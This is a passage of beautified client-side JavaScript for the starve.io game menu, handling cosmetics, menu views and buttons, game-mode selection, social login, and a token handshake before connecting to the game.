        var e = Number(Cookies.get("starve_crate"));
        var i = Number(Cookies.get("starve_dead"));
        var t = Number(Cookies.get("starve_book"));
        var r = Number(Cookies.get("starve_bag"));
        var n = Number(Cookies.get("starve_skin"));
        var a = Number(Cookies.get("starve_accessory"));
        if (!(n_.unlock.skin[n_.skin] > 0)) {
          n_.skin = n_.unlock.skin[n] > 0 ? n : 0;
        }
        if (!(n_.unlock.book[n_.book] > 0)) {
          n_.book = n_.unlock.book[t] > 0 ? t : 0;
        }
        if (!(n_.unlock.dead[n_.dead] > 0)) {
          n_.dead = n_.unlock.dead[i] > 0 ? i : 0;
        }
        if (!(n_.unlock.crate[n_.crate] > 0)) {
          n_.crate = n_.unlock.crate[e] > 0 ? e : 0;
        }
        if (!(n_.unlock.accessory[n_.accessory] > 0)) {
          n_.accessory = n_.unlock.accessory[a] > 0 ? a : 0;
        }
        if (!(n_.unlock.bag[n_.bag] > 0)) {
          n_.bag = n_.unlock.bag[r] > 0 ? r : 0;
        }
      }
      function F(e) {
        if (t.in_this_view !== false) {
          Y(g, $, "none");
          Y(C, $, "none");
          k();
          if (!(e === t.current_view || t.spin >= 1)) {
            Y(t.current_view, $, "none");
            t.current_view = e;
            Y(t.current_view, ee, "inline-block");
          }
        }
      }
      function x() {
        k();
        console.log("Connecting to game");
        client.connect();
      }
      this.hijackedAsset = 0;
      this.select_subview = F;
      this.play_game = function () {
        if (t.waiting === false) {
          __.reconnect.enabled = false;
          t.waiting = true;
          if (__.newToken) {
            x();
          } else {
            (function (e, i, t) {
              const r = new XMLHttpRequest();
              r.open("GET", e);
              r.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
              r.onreadystatechange = function () {
                if (this.readyState == 4 && this.status == 200) {
                  if (i !== undefined) {
                    i(r.responseText);
                  }
                } else if (this.readyState == 4 && t !== undefined) {
                  t();
                }
              };
              r.send();
            })(`${O_}token`, function (e) {
              console.log("::: [iandev] /token token :::", e);
              try {
                const i = e.split("_");
                const t = i[0] + "_";
                const r = Number(i[1]);
                const n = Math.abs(entrypoint(r));
                console.log("::: [iandev] /challenge token :::", n);
                __.newToken = t + n;
              } catch (e) {
                console.error("::: [iandev] /token error :::", e);
              }
              x();
            }, function () {
              t.waiting = false;
            });
          }
        }
      };
      var J = 1;
      var X = 2;
      var q = 4;
      var j = 8;
      var Z = 16;
      var Q = 32;
      var $ = 0;
      var ee = 1;
      if (window.innerWidth < 1300) {
        this.nickname = {
          id: document.getElementById("nickname_block"),
          style: document.getElementById("nickname_block").style,
          input: document.getElementById("nickname_input"),
          active: ee,
          position: q | J,
          view: d,
          translate: {
            x: 0,
            y: 0,
            _x: 200,
            _y: 184
          }
        };
      } else {
        this.nickname = {
          id: document.getElementById("nickname_block"),
          style: document.getElementById("nickname_block").style,
          input: document.getElementById("nickname_input"),
          active: ee,
          position: q | Z,
          view: d,
          translate: {
            x: 0,
            y: 0,
            _x: -180,
            _y: 184
          }
        };
      }
      this.nickname.id.addEventListener("keyup", function (e) {
        e.preventDefault();
        if (!(e.keyCode != 13 || t.waiting || t.settings)) {
          t.play_game();
        }
      });
      this.nickname.input.value = Cookies.get("starve_nickname") ? Cookies.get("starve_nickname") : "";
      this.account_nickname = {
        id: document.getElementById("account_nickname_block"),
        style: document.getElementById("account_nickname_block").style,
        input: document.getElementById("account_nickname_input"),
        active: $,
        position: q | Z,
        view: h,
        translate: {
          x: 0,
          y: 0,
          _x: -122,
          _y: 110
        }
      };
      if (window.innerWidth < 1300) {
        this.server_list = {
          id: document.getElementById("servselect"),
          style: document.getElementById("servselect").style,
          active: ee,
          position: q | J,
          view: d,
          translate: {
            x: 0,
            y: 0,
            _x: 208,
            _y: 225
          }
        };
      } else {
        this.server_list = {
          id: document.getElementById("servselect"),
          style: document.getElementById("servselect").style,
          active: ee,
          position: q | Z,
          view: d,
          translate: {
            x: 0,
            y: 0,
            _x: -180,
            _y: 225
          }
        };
      }
      this.leaderboard = {
        id: document.getElementById("leaderboard"),
        style: document.getElementById("leaderboard").style,
        active: $,
        position: q | Z,
        view: c,
        translate: {
          x: 0,
          y: 0,
          _x: -294.5,
          _y: 190
        }
      };
      this.stats_box = {
        id: document.getElementById("stats_box"),
        style: document.getElementById("stats_box").style,
        active: $,
        position: q | Z,
        view: h,
        translate: {
          x: 0,
          y: 0,
          _x: 125,
          _y: 187
        }
      };
      this.serverAddressBlock = {
        id: document.getElementById("serverAddressBlock"),
        style: document.getElementById("serverAddressBlock").style,
        input: document.getElementById("serverAddressInput"),
        active: $,
        position: q | Z,
        view: U,
        translate: {
          x: 0,
          y: 0,
          _x: -220,
          _y: 350
        }
      };
      A = 0;
      this.css = [];
      this.css[A++] = this.nickname;
      this.css[A++] = this.server_list;
      this.css[A++] = this.leaderboard;
      this.css[A++] = this.account_nickname;
      this.css[A++] = this.stats_box;
      this.css[A++] = this.serverAddressBlock;
      A = 0;
      this.bkgd = [];
      this.bkgd[A++] = ns(IMAGES.AVATAR_RESUME, ee, 0, 0, J);
      this.bkgd[A++] = ns(IMAGES.AVATAR_LVL1, $, 0, 0, J);
      this.bkgd[A++] = ns(IMAGES.AVATAR_LVL2, $, 0, 0, J);
      this.bkgd[A++] = ns(IMAGES.AVATAR_LVL3, $, 0, 0, J);
      this.bkgd[A++] = ns(IMAGES.AVATAR_LVL4, $, 0, 0, J);
      this.bkgd[A++] = ns(IMAGES.AVATAR_LVL5, $, 0, 0, J);
      this.bkgd[A++] = ns(IMAGES.AVATAR_LVL6, $, 0, 0, J);
      this.bkgd[A++] = ns(IMAGES.AVATAR_LVL7, $, 0, 0, J);
      this.bkgd[A++] = ns(IMAGES.AVATAR_LVL8, $, 0, 0, J);
      this.bkgd[A++] = ns(IMAGES.AVATAR_LVL9, $, 0, 0, J);
      this.bkgd[A++] = ns(IMAGES.AVATAR_LVL10, $, 0, 0, J);
      this.bkgd[A++] = ns(IMAGES.AVATAR_LVL11, $, 0, 0, J);
      this.bkgd[A++] = ns(IMAGES.AVATAR_LVL12, $, 0, 0, J);
      this.bkgd[A++] = ns(IMAGES.AVATAR_LVL13, $, 0, 0, J);
      this.bkgd[A++] = ns(IMAGES.AVATAR_LVL14, $, 0, 0, J);
      this.bkgd[A++] = ns(IMAGES.AVATAR_LVL15, $, 0, 0, J);
      this.bkgd[A++] = ns(IMAGES.AVATAR_LVL16, $, 0, 0, J);
      this.bkgd[A++] = ns(IMAGES.AVATAR_LVL17, $, 0, 0, J);
      this.bkgd[A++] = ns(IMAGES.AVATAR_LVL18, $, 0, 0, J);
      if (window.innerWidth < 1300) {
        this.bkgd[A] = ns(IMAGES.LOGO_INTERFACE, ee, 200, 100, q | J);
      } else {
        this.bkgd[A] = ns(IMAGES.LOGO_INTERFACE, ee, -753 / 4, 100, q | Z);
      }
      this.bkgd[A++].view = d;
      this.bkgd[A++] = ns(IMAGES.LINKS_BG, ee, 403, -10, X);
      if (window.innerWidth > 1300) {
        this.bkgd[A] = ns(IMAGES.CHANGELOG_BOX, ee, -885 / 4, -159.5, j | Z);
        this.bkgd[A++].view = d;
      }
      this.bkgd[A] = ns(IMAGES.PROFILE_BOX, $, -323.25, 100, q | Z);
      this.bkgd[A++].view = h;
      this.bkgd[A] = ns(IMAGES.SKINS_BOX, $, -356.25, 100, q | Z);
      this.bkgd[A++].view = u;
      this.bkgd[A] = ns(IMAGES.ACCOUNT_BOX, $, -905 / 4, 50, q | Z);
      this.bkgd[A++].view = I;
      this.bkgd[A] = ns(IMAGES.SHOP_BOX, $, -402, 130, q | Z);
      this.bkgd[A++].view = l;
      this.bkgd[A] = ns(IMAGES.SERVER_LOCATION_BOX, $, -279.25, 130, q | Z);
      this.bkgd[A++].view = w;
      this.bkgd[A] = ns(IMAGES.SERVER_DURATION_BOX, $, -305.5, 130, q | Z);
      this.bkgd[A++].view = K;
      this.bkgd[A] = ns(IMAGES.SERVER_ACCESS_BOX, $, -305.5, 100, q | Z);
      this.bkgd[A++].view = U;
      this.bkgd[A] = ns(IMAGES.TUTORIAL_BOX, $, -374.25, 110, q | Z);
      this.bkgd[A++].view = O;
      this.bkgd[A] = ns(IMAGES.LEADERBOARD_BOX, $, -306.5, 100, q | Z);
      this.bkgd[A++].view = c;
      this.bkgd[A] = ns(IMAGES.BUY_BREAD_BOX, $, -345.25, 80, q | Z);
      this.bkgd[A++].view = R;
      this.bkgd[A] = ns(IMAGES.SPIN1, $, -385.5, 150, q | Z);
      this.bkgd[A++].view = N;
      var ie = 3.6;
      var te = this.create_spin([["#25c5d6", 10.8], ["#e2cf27", 36], ["#afac98", 108], ["#d88e23", ie * 57]]);
      this.bkgd[A] = ns(te, $, -te.width / 4, 178, q | Z);
      this.bkgd[A++].view = N;
      this.play_spin = function (e, i, r) {
        var n;
        t.spin = 1;
        t.spin_effect = 0;
        t.spin_win_effect = 0;
        t.spin_target = e;
        t.spin_type = i;
        var a = 0;
        if (i === 0) {
          for (a = 0; a < COSMETICS.SKIN.length && r !== COSMETICS.SKIN[a].id; a++);
          n = COSMETICS.SKIN[a];
          t.unlock.skin[a] = 1;
        } else if (i === 1) {
          for (a = 0; a < COSMETICS.ACCESSORY.length && r !== COSMETICS.ACCESSORY[a].id; a++);
          n = COSMETICS.ACCESSORY[a];
          t.unlock.accessory[a] = 1;
        } else if (i === 2) {
          for (a = 0; a < COSMETICS.BAG.length && r !== COSMETICS.BAG[a].id; a++);
          n = COSMETICS.BAG[a];
          t.unlock.bag[a] = 1;
        } else if (i === 3) {
          for (a = 0; a < COSMETICS.BOOK.length && r !== COSMETICS.BOOK[a].id; a++);
          n = COSMETICS.BOOK[a];
          t.unlock.book[a] = 1;
        } else if (i === 4) {
          for (a = 0; a < COSMETICS.CRATE.length && r !== COSMETICS.CRATE[a].id; a++);
          n = COSMETICS.CRATE[a];
          t.unlock.crate[a] = 1;
          t.unlock.dead[a] = 1;
        }
        t.spin_win = a;
        t.spin_author = ts("by " + n.author, 0, "#EFE4B4", 40, 500, undefined, 30, 24, undefined, undefined, undefined, undefined, "#000000", 24);
        t.spin_name = ts(n.name, 0, "#EFE4B4", 60, 600, undefined, 30, 24, undefined, undefined, undefined, undefined, "#000000", 20);
      };
      this.spin = 0;
      this.spin_effect = 0;
      this.spin_target = 0;
      this.spin_type = 0;
      this.spin_win_effect = 0;
      this.spin_author = undefined;
      this.spin_name = undefined;
      var ae = 197;
      this.bkgd[A] = ns(IMAGES.SPIN2, $, -385.5, 150, q | Z);
      this.bkgd[A++].view = L;
      te = this.create_spin([["#d45ce5", 10.8], ["#25c5d6", 36], ["#e2cf27", 108], ["#afac98", ie * 57]]);
      this.bkgd[A] = ns(te, $, -te.width / 4, 178, q | Z);
      this.bkgd[A++].view = L;
      this.bkgd[A] = ns(IMAGES.SPIN3, $, -385.5, 150, q | Z);
      this.bkgd[A++].view = D;
      te = this.create_spin([["#d33a2a", 10.8], ["#d45ce5", 36], ["#25c5d6", 108], ["#e2cf27", ie * 57]]);
      this.bkgd[A] = ns(te, $, -te.width / 4, 178, q | Z);
      this.bkgd[A++].view = D;
      this.bkgd[A] = ns(IMAGES.SPIN4, $, -385.5, 150, q | Z);
      this.bkgd[A++].view = M;
      te = this.create_spin([["#25c5d6", 10.8], ["#e2cf27", 36], ["#afac98", 108], ["#d88e23", ie * 57]]);
      this.bkgd[A] = ns(te, $, -te.width / 4, 178, q | Z);
      this.bkgd[A++].view = M;
      this.bkgd[A] = ns(IMAGES.SPIN5, $, -385.5, 150, q | Z);
      this.bkgd[A++].view = b;
      te = this.create_spin([["#d45ce5", 10.8], ["#25c5d6", 36], ["#e2cf27", 108], ["#afac98", ie * 57]]);
      this.bkgd[A] = ns(te, $, -te.width / 4, 178, q | Z);
      this.bkgd[A++].view = b;
      this.bkgd[A] = ns(IMAGES.SPIN6, $, -385.5, 150, q | Z);
      this.bkgd[A++].view = G;
      te = this.create_spin([["#d33a2a", 10.8], ["#d45ce5", 36], ["#25c5d6", 108], ["#e2cf27", ie * 57]]);
      this.bkgd[A] = ns(te, $, -te.width / 4, 178, q | Z);
      this.bkgd[A++].view = G;
      this.bkgd[A] = ns(IMAGES.CUSTOM_SKIN_BOX, $, -341.5, 100, q | Z);
      this.bkgd[A++].view = f;
      this.bkgd[A] = ns(IMAGES.ACCESSORIES_BOX, $, -341.5, 100, q | Z);
      this.bkgd[A++].view = B;
      this.bkgd[A] = ns(IMAGES.BAG_BOX, $, -341.5, 100, q | Z);
      this.bkgd[A++].view = P;
      this.bkgd[A] = ns(IMAGES.BOOK_BOX, $, -341.5, 100, q | Z);
      this.bkgd[A++].view = y;
      this.bkgd[A] = ns(IMAGES.CRATE_BOX, $, -341.5, 100, q | Z);
      this.bkgd[A++].view = H;
      this.bkgd[A] = ns(IMAGES.LOOT_BOX, $, -341.5, 100, q | Z);
      this.bkgd[A++].view = z;
      BAG_REMAIN_BOX = A++;
      this.bkgd[BAG_REMAIN_BOX] = ns(IMAGES.BAG_REMAIN_BOX, $, 484, 0, q);
      SERVER_REMAIN_BOX = A++;
      this.bkgd[SERVER_REMAIN_BOX] = ns(IMAGES.SERVER_REMAIN_BOX, $, 812.5, 0, q);
      this.bkgd[A] = ns(IMAGES.LOCKED_CUSTOM_ALERT, $, -189.5, -5, q | Z);
      this.bkgd[A++].view = C;
      this.bkgd[A] = ns(IMAGES.LOCKED_SKIN_ALERT, $, -189.5, -5, q | Z);
      this.bkgd[A++].view = g;
      LEVEL_GAUGE = A++;
      this.bkgd[LEVEL_GAUGE] = ns(IMAGES.GAUGE, ee, 93, 30, q);
      this.bkgd[A] = ns(IMAGES.CHANGE_NICKNAME1_BOX, $, -173, 110, q | Z);
      this.bkgd[A++].view = W;
      this.bkgd[A] = ns(IMAGES.CHANGE_NICKNAME0_BOX, $, -173, 110, q | Z);
      this.bkgd[A++].view = V;
      A = 0;
      this.buttons = [];
      this.buttons[A] = rs(50, 57, 0, [IMAGES.BUY_BREAD_OUT, IMAGES.BUY_BREAD_IN, IMAGES.BUY_BREAD_CLICK], 1, 0, function () {
        if (t.isUserLogged()) {
          F(R);
        } else {
          F(I);
        }
      }, 320, 0, J, ee);
      A++;
      if (window.innerWidth < 1300) {
        this.buttons[A] = rs(202, 97, 0, [IMAGES.PLAY_BUTTON_OUT, IMAGES.PLAY_BUTTON_IN, IMAGES.PLAY_BUTTON_CLICK], 1, 0, this.play_game, 462, 235, q | J, ee);
      } else {
        this.buttons[A] = rs(202, 97, 0, [IMAGES.PLAY_BUTTON_OUT, IMAGES.PLAY_BUTTON_IN, IMAGES.PLAY_BUTTON_CLICK], 1, 0, this.play_game, 74, 235, q | Z, ee);
      }
      this.buttons[A].view = d;
      A++;
      if (window.innerWidth > 1300) {
        this.buttons[A] = rs(355, 168, 0, [IMAGES.CHANGELOG_BUTTON_OUT, IMAGES.CHANGELOG_BUTTON_OUT, IMAGES.CHANGELOG_BUTTON_OUT], 1, 0, function () {
          window.open("./changelog.html", "_blank");
        }, -195, -115, j | Z, ee);
        this.buttons[A++].view = d;
        this.buttons[A] = rs(355, 168, 0, [IMAGES.DEVASTIO_BUTTON_OUT, IMAGES.DEVASTIO_BUTTON_OUT, IMAGES.DEVASTIO_BUTTON_OUT], 1, 0, function () {
          window.open("https://devast.io", "_blank");
        }, 20, -115, j | Z, ee);
        this.buttons[A++].view = d;
      }
      this.buttons[A++] = rs(80, 80, 0, [IMAGES.MERCH_BUTTON_OUT, IMAGES.MERCH_BUTTON_IN, IMAGES.MERCH_BUTTON_CLICK], 1, 0, function () {
        window.open("https://shop.addictinggames.com/", "_blank");
      }, 380, 10, X, ee);
      this.buttons[A++] = rs(80, 80, 0, [IMAGES.DISCORD_BUTTON_OUT, IMAGES.DISCORD_BUTTON_IN, IMAGES.DISCORD_BUTTON_CLICK], 1, 0, function () {
        window.open("https://discord.gg/starveio", "_blank");
      }, 330, 10, X, ee);
      this.buttons[A++] = rs(80, 80, 0, [IMAGES.REDDIT_BUTTON_OUT, IMAGES.REDDIT_BUTTON_IN, IMAGES.REDDIT_BUTTON_CLICK], 1, 0, function () {
        window.open("https://reddit.com/r/starveio", "_blank");
      }, 280, 10, X, ee);
      this.buttons[A++] = rs(80, 80, 0, [IMAGES.WIKI_BUTTON_OUT, IMAGES.WIKI_BUTTON_IN, IMAGES.WIKI_BUTTON_CLICK], 1, 0, function () {
        window.open("https://starveiopro.wikia.com/wiki/", "_blank");
      }, 230, 10, X, ee);
      this.buttons[A++] = rs(80, 80, 0, [IMAGES.FACEBOOK_BUTTON_OUT, IMAGES.FACEBOOK_BUTTON_IN, IMAGES.FACEBOOK_BUTTON_CLICK], 1, 0, function () {
        window.open("https://www.facebook.com/pages/category/Video-Game/limaxio-571818073000979/", "_blank");
      }, 155, 10, X, ee);
      this.buttons[A++] = rs(80, 80, 0, [IMAGES.TWITTER_BUTTON_OUT, IMAGES.TWITTER_BUTTON_IN, IMAGES.TWITTER_BUTTON_CLICK], 1, 0, function () {
        window.open("https://twitter.com/lapamauve", "_blank");
      }, 105, 10, X, ee);
      this.buttons[A++] = rs(80, 80, 0, [IMAGES.YOUTUBE_BUTTON_OUT, IMAGES.YOUTUBE_BUTTON_IN, IMAGES.YOUTUBE_BUTTON_CLICK], 1, 0, function () {
        window.open("https://youtube.com/c/lapamauve", "_blank");
      }, 55, 10, X, ee);
      LEADERBOARD_BUTTON = A++;
      this.buttons[LEADERBOARD_BUTTON] = rs(232, 142, 0, [IMAGES.ICONS_BOTTOM_BG_BUTTON_OUT, IMAGES.ICONS_BOTTOM_BG_BUTTON_IN, IMAGES.ICONS_BOTTOM_BG_BUTTON_CLICK], 1, 0, function () {
        F(c);
        W_(n_.LEADERBOARD_ALL, n_.LEADERBOARD_TOTAL, n_.LEADERBOARD_SCORE, n_.LEADERBOARD_SEASON5);
      }, -5, 573, J, ee);
      this.buttons[A++] = rs(236, 165, 0, [IMAGES.LEADERBOARD_ICON, IMAGES.LEADERBOARD_ICON, IMAGES.LEADERBOARD_ICON], 1, 1, function () {
        F(c);
      }, -5, 566, J, ee);
      TUTORIAL_BUTTON = A++;
      this.buttons[TUTORIAL_BUTTON] = rs(236, 165, 0, [IMAGES.ICONS_BG_BUTTON_OUT, IMAGES.ICONS_BG_BUTTON_IN, IMAGES.ICONS_BG_BUTTON_CLICK], 1, 0, function () {
        F(O);
      }, -5, 494, J, ee);
      this.buttons[A++] = rs(236, 165, 0, [IMAGES.TUTORIAL_ICON, IMAGES.TUTORIAL_ICON, IMAGES.TUTORIAL_ICON], 1, 1, function () {
        F(O);
      }, -5, 494, J, ee);
      SERVER_BUTTON = A++;
      this.buttons[SERVER_BUTTON] = rs(236, 165, 0, [IMAGES.ICONS_BG_BUTTON_OUT, IMAGES.ICONS_BG_BUTTON_IN, IMAGES.ICONS_BG_BUTTON_CLICK], 1, 0, function () {
        if (t.isUserLogged()) {
          if (n_.privateServerTime - Date.now() > 0) {
            F(U);
          }
        } else {
          F(I);
        }
      }, -5, 415, J, ee);
      this.buttons[A++] = rs(236, 165, 0, [IMAGES.SERVER_ACCESS_ICON, IMAGES.SERVER_ACCESS_ICON, IMAGES.SERVER_ACCESS_ICON], 1, 1, function () {
        if (t.isUserLogged()) {
          if (n_.privateServerTime - Date.now() > 0) {
            F(U);
          }
        } else {
          F(I);
        }
      }, -5, 415, J, ee);
      SHOP_BUTTON = A++;
      this.buttons[SHOP_BUTTON] = rs(236, 165, 0, [IMAGES.ICONS_BG_BUTTON_OUT, IMAGES.ICONS_BG_BUTTON_IN, IMAGES.ICONS_BG_BUTTON_CLICK], 1, 0, function () {
        F(l);
      }, -5, 336, J, ee);
      this.buttons[A++] = rs(236, 165, 0, [IMAGES.SHOP_ICON, IMAGES.SHOP_ICON, IMAGES.SHOP_ICON], 1, 1, function () {
        F(l);
      }, -5, 336, J, ee);
      COSMETICS_BUTTON = A++;
      this.buttons[COSMETICS_BUTTON] = rs(236, 165, 0, [IMAGES.ICONS_BG_BUTTON_OUT, IMAGES.ICONS_BG_BUTTON_IN, IMAGES.ICONS_BG_BUTTON_CLICK], 1, 0, function () {
        F(u);
      }, -5, 257, J, ee);
      this.buttons[A++] = rs(236, 165, 0, [IMAGES.SKINS_ICON, IMAGES.SKINS_ICON, IMAGES.SKINS_ICON], 1, 1, function () {
        F(u);
      }, -5, 257, J, ee);
      GAME_BUTTON = A++;
      this.buttons[GAME_BUTTON] = rs(236, 165, 0, [IMAGES.ICONS_BG_BUTTON_OUT, IMAGES.ICONS_BG_BUTTON_IN, IMAGES.ICONS_BG_BUTTON_CLICK], 1, 0, function () {
        F(d);
      }, -5, 178, J, ee);
      this.buttons[A++] = rs(236, 165, 0, [IMAGES.START_ICON, IMAGES.START_ICON, IMAGES.START_ICON], 1, 1, function () {
        F(d);
      }, -5, 178, J, ee);
      LOGIN_BUTTON = A++;
      this.LOGIN_BUTTON = LOGIN_BUTTON;
      this.buttons[LOGIN_BUTTON] = rs(324, 222, 0, [IMAGES.LOGIN_BUTTON_OUT, IMAGES.LOGIN_BUTTON_IN, IMAGES.LOGIN_BUTTON_CLICK], 1, 0, function () {
        F(I);
      }, 0, 70, J, ee);
      PROFILE_BUTTON = A++;
      PROFILE_BUTTON_2 = A++;
      this.PROFILE_BUTTON = PROFILE_BUTTON;
      this.PROFILE_BUTTON_2 = PROFILE_BUTTON_2;
      this.buttons[PROFILE_BUTTON] = rs(324, 222, 0, [IMAGES.PROFILE_BUTTON_OUT, IMAGES.PROFILE_BUTTON_IN, IMAGES.PROFILE_BUTTON_CLICK], 1, 0, function () {
        F(h);
        he(-1);
      }, 0, 70, J, $);
      this.buttons[PROFILE_BUTTON_2] = rs(324, 222, 0, [IMAGES.PROFILE_ICON, IMAGES.PROFILE_ICON, IMAGES.PROFILE_ICON], 1, 1, function () {
        F(h);
        he(-1);
      }, 0, 70, J, $);
      if (client.privateServer === 0) {
        var oe = A++;
        if (window.innerWidth < 1300) {
          this.buttons[oe] = rs(266, 176, 0, [IMAGES.NORMAL_MODE_OUT, IMAGES.NORMAL_MODE_IN, IMAGES.NORMAL_MODE_CLICK], 1, 0, function () {
            client.select_gamemode(ds.MODE_PVP);
          }, 150, 300, J | q, ee);
        } else {
          this.buttons[oe] = rs(266, 176, 0, [IMAGES.NORMAL_MODE_OUT, IMAGES.NORMAL_MODE_IN, IMAGES.NORMAL_MODE_CLICK], 1, 0, function () {
            client.select_gamemode(ds.MODE_PVP);
          }, -340, 100, Z | q, ee);
        }
        this.buttons[oe].view = d;
        this.buttons[oe].hint = 0;
        var _e = A++;
        if (window.innerWidth < 1300) {
          this.buttons[_e] = rs(266, 176, 0, [IMAGES.FOREST_MODE_OUT, IMAGES.FOREST_MODE_IN, IMAGES.FOREST_MODE_CLICK], 1, 0, function () {
            client.select_gamemode(ds.MODE_LEGACY);
          }, 150, 400, J | q, ee);
        } else {
          this.buttons[_e] = rs(266, 176, 0, [IMAGES.FOREST_MODE_OUT, IMAGES.FOREST_MODE_IN, IMAGES.FOREST_MODE_CLICK], 1, 0, function () {
            client.select_gamemode(ds.MODE_LEGACY);
          }, -340, 200, Z | q, ee);
        }
        this.buttons[_e].view = d;
        this.buttons[_e].hint = 0;
        var Ee = A++;
        if (window.innerWidth < 1300) {
          this.buttons[Ee] = rs(266, 176, 0, [IMAGES.MODE_COMMUNITY_OUT, IMAGES.MODE_COMMUNITY_IN, IMAGES.MODE_COMMUNITY_CLICK], 1, 0, function () {
            client.select_gamemode(ds.MODE_COMMUNITY);
          }, 450, 300, J | q, ee);
        } else {
          this.buttons[Ee] = rs(266, 176, 0, [IMAGES.MODE_COMMUNITY_OUT, IMAGES.MODE_COMMUNITY_IN, IMAGES.MODE_COMMUNITY_CLICK], 1, 0, function () {
            client.select_gamemode(ds.MODE_COMMUNITY);
          }, -340, 300, Z | q, ee);
        }
        this.buttons[Ee].view = d;
        this.buttons[Ee].hint = 0;
        var Te = A++;
        if (window.innerWidth < 1300) {
          this.buttons[Te] = rs(266, 176, 0, [IMAGES.ZOMBIE_MODE_OUT, IMAGES.ZOMBIE_MODE_IN, IMAGES.ZOMBIE_MODE_CLICK], 1, 0, function () {
            client.select_gamemode(ds.MODE_ZOMBIES);
          }, 300, 300, J | q, ee);
        } else {
          this.buttons[Te] = rs(266, 176, 0, [IMAGES.ZOMBIE_MODE_OUT, IMAGES.ZOMBIE_MODE_IN, IMAGES.ZOMBIE_MODE_CLICK], 1, 0, function () {
            client.select_gamemode(ds.MODE_ZOMBIES);
          }, 204, 100, Z | q, ee);
        }
        this.buttons[Te].view = d;
        this.buttons[Te].hint = 0;
        var Ae = A++;
        if (window.innerWidth < 1300) {
          this.buttons[Ae] = rs(266, 176, 0, [IMAGES.VAMPIRE_MODE_OUT, IMAGES.VAMPIRE_MODE_IN, IMAGES.VAMPIRE_MODE_CLICK], 1, 0, function () {
            client.select_gamemode(ds.MODE_VAMPIRES);
          }, 300, 400, J | q, ee);
        } else {
          this.buttons[Ae] = rs(266, 176, 0, [IMAGES.VAMPIRE_MODE_OUT, IMAGES.VAMPIRE_MODE_IN, IMAGES.VAMPIRE_MODE_CLICK], 1, 0, function () {
            client.select_gamemode(ds.MODE_VAMPIRES);
          }, 204, 200, Z | q, ee);
        }
        this.buttons[Ae].view = d;
        this.buttons[Ae].hint = 0;
        var de = A++;
        this.buttons[de] = rs(266, 176, 0, [IMAGES.MODE_EXPERIMENTAL_OUT, IMAGES.MODE_EXPERIMENTAL_IN, IMAGES.MODE_EXPERIMENTAL_CLICK], 1, 0, function () {
          client.select_gamemode(ds.MODE_EXPERIMENTAL);
        }, window.innerWidth < 1300 ? 450 : 204, window.innerWidth < 1300 ? 400 : 300, (window.innerWidth < 1300 ? J : Z) | q, ee);
        this.buttons[de].view = d;
        this.buttons[de].hint = 0;
      }
      function he(e, i) {
        if (i !== undefined) {
          n_.profile_season = i;
          var t = n_.seasons[i];
          n_.score = t.score;
          n_.kill = t.kill;
          n_.death = t.death;
          n_.time = t.time;
          n_.bestScore = t.bestScore;
          n_.bestKill = t.bestKill;
          n_.bestTime = t.bestTime;
          n_.scoreTotal = t.scoreTotal;
        }
        if (e === undefined) {
          e = n_.current_mode_score;
        }
        n_.current_mode_score = e;
        if (e >= 0) {
          document.getElementById("stats_box_time").innerHTML = n_.bestTime[e];
          document.getElementById("stats_box_kill").innerHTML = n_.bestKill[e];
          document.getElementById("stats_box_score").innerHTML = n_.bestScore[e];
        } else {
          for (var r = 0, n = 0; n < n_.kill.length; n++) {
            r += n_.kill[n];
          }
          var a = 0;
          for (n = 0; n < n_.time.length; n++) {
            a += n_.time[n];
          }
          document.getElementById("stats_box_time").innerHTML = a;
          document.getElementById("stats_box_kill").innerHTML = r;
          document.getElementById("stats_box_score").innerHTML = n_.score;
        }
      }
      this.buttons[A] = rs(87, 78, 0, [IMAGES.MODIFY_NAME_OUT, IMAGES.MODIFY_NAME_IN, IMAGES.MODIFY_NAME_CLICK], 1, 0, function () {
        n_.generate_new_nickname();
        if (n_.firstName === 0) {
          F(V);
        } else {
          F(W);
        }
      }, 127, 110, Z | q, $);
      this.buttons[A++].view = h;
      this.buttons[A] = rs(87, 78, 0, [IMAGES.LOGOUT_OUT, IMAGES.LOGOUT_IN, IMAGES.LOGOUT_CLICK], 1, 0, function () {
        !function () {
          if (g_ === R_ && window.FB.getUserID()) {
            window.FB.logout();
          }
          if (g_ === c_ && m_ !== undefined) {
            window.gapi.auth2.getAuthInstance().signOut();
            m_ = undefined;
          }
          N_ = undefined;
          C_ = undefined;
          g_ = undefined;
          n_.kit = 0;
          n_.bread = 0;
          n_.score = 0;
          n_.unlock_cosmetics();
          onUserLogout();
        }();
      }, 255, 110, Z | q, $);
      this.buttons[A++].view = h;
      this.buttons[A] = rs(58, 64, 0, [IMAGES.CLOSE_BUTTON_OUT, IMAGES.CLOSE_BUTTON_IN, IMAGES.CLOSE_BUTTON_CLICK], 1, 0, function () {
        F(d);
      }, 189, 118, Z | q, $);
      this.buttons[A++].view = I;
      this.buttons[A] = rs(497, 72, 0, [IMAGES.LOGIN_GOOGLE_OUT, IMAGES.LOGIN_GOOGLE_IN, IMAGES.LOGIN_GOOGLE_CLICK], 1, 0, function () {
        window.gapi.auth2.getAuthInstance().signIn();
      }, -130, 390, Z | q, $);
      this.buttons[A++].view = I;
      this.buttons[A] = rs(497, 72, 0, [IMAGES.LOGIN_FACEBOOK_OUT, IMAGES.LOGIN_FACEBOOK_IN, IMAGES.LOGIN_FACEBOOK_CLICK], 1, 0, function () {
        window.FB.login(function (e) {
          if (e.authResponse) {
            window.FB.api("/me", function (e) {
              g_ = R_;
              C_ = window.FB.getAuthResponse().accessToken;
              G_();
              window.onUserLogin(N_);
            });
          }
        });
      }, -130, 430, Z | q, $);
      this.buttons[A++].view = I;
      __LEVEL_FACTOR__ = 20000;
      this.xp_formula = function (e) {
        var i = n_.level_formula(e);
        var t = i * i * __LEVEL_FACTOR__;
        return (e -= t) / ((i + 1) * (i + 1) * __LEVEL_FACTOR__ - t);
      };
      this.level_formula = function (e) {
        return Math.floor(Math.sqrt(e / __LEVEL_FACTOR__));
      };
      this.update_score = function (e) {
        n_.lvl = n_.level_formula(e);
        n_.xp_dest = n_.xp_formula(e);
        n_.xp = 0;
        n_.score = e;
      };
      this.login_restore_data = function (e) {
        n_.buttons[n_.LOGIN_BUTTON].info.active = 0;
        n_.buttons[n_.PROFILE_BUTTON].info.active = 1;
        n_.buttons[n_.PROFILE_BUTTON_2].info.active = 1;
        n();
        if (e.name.indexOf("Starver#") === -1) {
          document.getElementById("account_nickname_input").value = window.decodeURIComponent(window.escape(window.atob(e.name)));
        } else {
          document.getElementById("account_nickname_input").value = e.name;
        }
        n_.bread = e.bread;
        var i = e.seasons;
        var r = i[i.length - 1];
        n_.seasons = i;
